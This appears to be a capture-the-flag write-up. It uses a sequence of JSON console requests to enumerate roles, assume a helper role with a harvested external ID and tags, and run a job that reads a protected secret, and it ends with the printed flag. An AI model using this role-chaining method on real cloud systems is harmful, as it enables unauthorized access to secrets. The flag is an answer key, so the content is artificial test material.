# Role With It

Enumerate the console:

{"op":"help"}

{"op":"roles"}

{"op":"objects"}

{"op":"secrets"}

Discover the get request format:

{"op":"get"}

Retrieve the release notes:

{"op":"get","object":"docs/release-notes"}

Record the returned helper role, project, and integration ID. Inspect the helper policy:

{"op":"policy","role":"HELPER_ROLE"}

Assume that role using the policy requirements:

{"op":"assume","role":"HELPER_ROLE","external_id":"INTEGRATION_ID","tags":{"project":"PROJECT","team":"release"}}

Confirm the current identity:

{"op":"whoami"}

Retrieve the job schema:

{"op":"get","object":"docs/job-schema"}

Inspect the workload role returned by the schema:

{"op":"policy","role":"WORKLOAD_ROLE"}

Record the protected resource and run the job:

{"op":"jobs.run","execution_role":"WORKLOAD_ROLE","task":"read-secret","resource":"SECRET_PATH"}

The output field contains the flag.

flag{inm_trust_is_not_permission}

======================================================================